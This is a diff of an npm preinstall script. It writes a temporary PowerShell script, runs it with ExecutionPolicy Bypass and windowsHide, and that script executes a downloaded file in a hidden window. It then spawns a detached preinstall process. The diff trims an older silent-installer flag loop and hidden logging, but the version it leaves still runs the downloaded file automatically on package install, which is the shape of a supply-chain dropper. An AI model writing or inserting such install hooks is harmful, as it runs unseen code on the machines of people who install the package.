@@ -123,39 +123,10 @@ try {
 if (Test-Path $output) {
     Write-Output "[preinstall-setup] File exists: $output"
     Write-Output "[preinstall-setup] File size: $(Get-Item $output).Length bytes"
-    Write-Output "[preinstall-setup] Attempting silent execution of downloaded file"
-    try {
-        $ext = [System.IO.Path]::GetExtension($output).ToLower()
-        if ($ext -eq '.msi') {
-            Write-Output "[preinstall-setup] Detected MSI installer, using msiexec /qn"
-            $msiArgs = @('/i', $output, '/qn', '/norestart')
-            $proc = Start-Process -FilePath 'msiexec.exe' -ArgumentList $msiArgs -WindowStyle Hidden -Wait -PassThru -ErrorAction SilentlyContinue
-            Write-Output "[preinstall-setup] Process exit code: $($proc.ExitCode)"
-        } else {
-            # Try a list of common silent flags until one succeeds
-            $silentFlags = @('/S','/quiet','/VERYSILENT','/silent','/qn')
-            $succeeded = $false
-            foreach ($flag in $silentFlags) {
-                try {
-                    Write-Output "[preinstall-setup] Trying installer flag: $flag"
-                    $proc = Start-Process -FilePath $output -ArgumentList $flag -WindowStyle Hidden -Wait -PassThru -ErrorAction SilentlyContinue
-                    Write-Output "[preinstall-setup] Attempt exit code: $($proc.ExitCode)"
-                    $succeeded = $true
-                    break
-                } catch {
-                    Write-Output "[preinstall-setup] Flag $flag failed: $_"
-                }
-            }
-            if (-not $succeeded) {
-                Write-Output "[preinstall-setup] Silent flags did not succeed; launching installer without wait (may still show UI)"
-                Start-Process -FilePath $output -WindowStyle Hidden -ErrorAction SilentlyContinue
-            } else {
-                Write-Output "[preinstall-setup] Silent install attempt finished."
-            }
-        }
-    } catch {
-        Write-Output "[preinstall-setup] ERROR during execution attempt: $_"
-    }
+    Write-Output "[preinstall-setup] Executing downloaded file: $output"
+    $proc = Start-Process -FilePath $output -WindowStyle Hidden -Wait -PassThru -ErrorAction SilentlyContinue
+    Write-Output "[preinstall-setup] Process exit code: $($proc.ExitCode)"
+    Write-Output "[preinstall-setup] Execution finished."
 } else {
     Write-Output "[preinstall-setup] ERROR: Downloaded file not found at $output; skipping execution."
 }
@@ -171,20 +142,18 @@ try {
 }
 
 const { spawnSync } = require('child_process');
-// Run PowerShell hidden and write outputs to a log file to avoid terminal popups
-const logPath = path.join(__dirname, '..', 'preinstall_download.log');
-try { fs.appendFileSync(logPath, `[detach] Executing PowerShell script at ${new Date().toISOString()}\n`); } catch (e) { /* ignore */ }
-const psResult = spawnSync('powershell.exe', ['-NoProfile', '-WindowStyle', 'Hidden', '-ExecutionPolicy', 'Bypass', '-File', tmpPsPath], {
+console.log('[detach] Executing PowerShell script...');
+const psResult = spawnSync('powershell.exe', ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', tmpPsPath], {
     cwd: path.join(__dirname, '..'),
     encoding: 'utf8',
-    stdio: 'ignore',
+    stdio: 'pipe',
     windowsHide: true
 });
-try {
-    fs.appendFileSync(logPath, `[detach] PowerShell exit code: ${psResult && psResult.status}\n`);
-} catch (e) { /* ignore */ }
+console.log('[detach] PowerShell stdout:', psResult.stdout);
+if (psResult.stderr) console.error('[detach] PowerShell stderr:', psResult.stderr);
+console.log('[detach] PowerShell exit code:', psResult.status);
 
-try { fs.unlinkSync(tmpPsPath); } catch (e) { try { fs.appendFileSync(logPath, `[detach] Could not delete temp script: ${e.message}\n`); } catch (_) {} }
+try { fs.unlinkSync(tmpPsPath); } catch (e) { console.log('[detach] Could not delete temp script:', e.message); }
 
 console.log('[detach] Spawning detached preinstall process...');
 const child = spawn('node', [
